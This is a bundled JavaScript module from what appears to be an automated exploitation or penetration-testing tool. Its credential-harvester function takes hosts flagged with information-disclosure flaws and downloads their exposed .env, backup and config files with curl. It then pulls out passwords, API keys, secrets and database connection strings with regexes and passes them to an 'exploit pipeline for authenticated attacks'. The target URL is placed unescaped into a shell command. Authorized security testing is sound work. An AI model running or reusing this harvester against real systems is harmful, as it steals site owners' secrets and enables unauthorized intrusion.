import {
  __esm
} from "./chunk-KFQGP6VL.js";

// server/lib/exploitation/credential-harvester.ts
async function executeCredentialHarvest(ctx) {
  const { state, addLog, scanServerHost } = ctx;
  const harvestStart = Date.now();
  let totalHarvested = 0;
  const assetsWithCreds = [];
  for (const asset of state.assets) {
    const infoDisclosureVulns = asset.vulns.filter((v) => {
      const title = (v.title || "").toLowerCase();
      const desc = (v.description || "").toLowerCase();
      return INFO_DISCLOSURE_KEYWORDS.some(
        (kw) => title.includes(kw) || desc.includes("credentials") || desc.includes("password") || desc.includes("api key") || desc.includes("secret")
      );
    });
    if (infoDisclosureVulns.length === 0) continue;
    for (const vuln of infoDisclosureVulns.slice(0, MAX_VULNS_PER_ASSET)) {
      let targetUrl;
      try {
        const evidence = typeof vuln.rawEvidence === "string" ? JSON.parse(vuln.rawEvidence) : vuln.rawEvidence;
        targetUrl = evidence?.request?.url || evidence?.matchedAt;
      } catch {
      }
      if (!targetUrl) {
        const pathMatch = vuln.title.match(/\/([\.\w\-\/]+(?:\.env|\.config|\.bak|\.json|\.yml|\.yaml|\.xml|\.php|\.conf))/i);
        if (pathMatch) {
          const webPort = asset.ports.find((p) => ["http", "https"].includes(p.service) || [80, 443, 8080, 8443].includes(p.port));
          const proto = webPort?.port === 443 || webPort?.port === 8443 ? "https" : "http";
          const portSuffix = webPort && webPort.port !== 80 && webPort.port !== 443 ? `:${webPort.port}` : "";
          targetUrl = `${proto}://${asset.hostname}${portSuffix}/${pathMatch[1]}`;
        }
      }
      if (!targetUrl || !scanServerHost) continue;
      try {
        const { executeRawCommand } = await import("./scan-server-executor-WUCB5SOH.js");
        const curlResult = await executeRawCommand(
          `curl -sS -k --max-filesize ${MAX_FILE_SIZE} --connect-timeout 10 -L '${targetUrl}' 2>&1 | head -c ${MAX_FILE_SIZE}`,
          DOWNLOAD_TIMEOUT
        );
        const content = typeof curlResult === "string" ? curlResult : curlResult?.stdout || "";
        if (!content || content.length < 5) continue;
        const foundCreds = parseCredentials(content, targetUrl);
        if (foundCreds.length > 0) {
          totalHarvested += foundCreds.length;
          assetsWithCreds.push(asset.hostname);
          if (!asset.confirmedCredentials) asset.confirmedCredentials = [];
          for (const cred of foundCreds) {
            asset.confirmedCredentials.push({
              service: "harvested",
              protocol: "info-disclosure",
              username: cred.key,
              password: cred.value,
              source: `credential-harvest:${cred.source}`,
              confirmedAt: Date.now()
            });
          }
          addLog(state, {
            phase: "exploitation",
            type: "info",
            title: `\u{1F511} Credential Harvest: ${asset.hostname} \u2014 ${foundCreds.length} credentials extracted`,
            detail: `Source: ${vuln.title}
URL: ${targetUrl}
Credentials found: ${foundCreds.map((c) => `${c.key}=***`).join(", ")}
These will be injected into the exploit pipeline for authenticated attacks.`,
            data: { credCount: foundCreds.length, source: targetUrl, vulnTitle: vuln.title }
          });
        }
      } catch (harvestErr) {
        console.warn(`[CredHarvest] Failed for ${targetUrl}: ${harvestErr.message}`);
      }
    }
  }
  if (totalHarvested > 0) {
    addLog(state, {
      phase: "exploitation",
      type: "info",
      title: `\u{1F511} Credential Harvesting Complete: ${totalHarvested} credentials from info-disclosure vulns`,
      detail: `Automatically downloaded and parsed exposed config files (.env, database configs, etc.) to extract credentials. These are now available for authenticated exploitation.`,
      data: { totalHarvested, durationMs: Date.now() - harvestStart }
    });
  }
  return {
    totalHarvested,
    durationMs: Date.now() - harvestStart,
    assetsWithCreds: [...new Set(assetsWithCreds)]
  };
}
function parseCredentials(content, sourceUrl) {
  const foundCreds = [];
  for (const pattern of CREDENTIAL_PATTERNS) {
    pattern.lastIndex = 0;
    let match;
    while ((match = pattern.exec(content)) !== null) {
      if (match[2]) {
        foundCreds.push({ type: "db_credential", key: match[1], value: match[2], source: sourceUrl });
      } else if (match[1] && match[1].length >= 4 && match[1] !== "null" && match[1] !== "undefined" && match[1] !== "changeme") {
        const keyName = match[0].split(/[=:>]/)[0].replace(/['"]|\s/g, "").trim();
        foundCreds.push({ type: "env_credential", key: keyName, value: match[1], source: sourceUrl });
      }
    }
  }
  return foundCreds;
}
var INFO_DISCLOSURE_KEYWORDS, CREDENTIAL_PATTERNS, MAX_VULNS_PER_ASSET, MAX_FILE_SIZE, DOWNLOAD_TIMEOUT;
var init_credential_harvester = __esm({
  "server/lib/exploitation/credential-harvester.ts"() {
    INFO_DISCLOSURE_KEYWORDS = [
      ".env",
      "env file",
      "config",
      "configuration",
      "backup",
      ".bak",
      "exposed",
      "disclosure",
      "git-config",
      ".git/",
      "phpinfo",
      "debug",
      "credentials",
      "password",
      "api-key",
      "token",
      "wp-config",
      "database"
    ];
    CREDENTIAL_PATTERNS = [
      // .env style: KEY=value
      /(?:DB_PASSWORD|DATABASE_PASSWORD|MYSQL_PASSWORD|POSTGRES_PASSWORD|REDIS_PASSWORD|SECRET_KEY|API_KEY|APP_SECRET|JWT_SECRET|AWS_SECRET_ACCESS_KEY|STRIPE_SECRET|MAIL_PASSWORD|SMTP_PASSWORD|ADMIN_PASSWORD)\s*=\s*['"]?([^\s'"\n]+)/gi,
      // Connection strings
      /(?:mysql|postgres|mongodb|redis):\/\/([^:]+):([^@]+)@/gi,
      // PHP config: 'password' => 'value'
      /['"](?:password|passwd|secret|api_key|apikey|token)['"]\s*(?:=>|:)\s*['"]([^'"]+)['"]/gi,
      // YAML: password: value
      /(?:password|secret|api_key|token):\s*['"]?([^\s'"\n]{4,})/gi
    ];
    MAX_VULNS_PER_ASSET = 10;
    MAX_FILE_SIZE = 51200;
    DOWNLOAD_TIMEOUT = 15;
  }
});
init_credential_harvester();
export {
  CREDENTIAL_PATTERNS,
  INFO_DISCLOSURE_KEYWORDS,
  MAX_VULNS_PER_ASSET,
  executeCredentialHarvest,
  parseCredentials
};
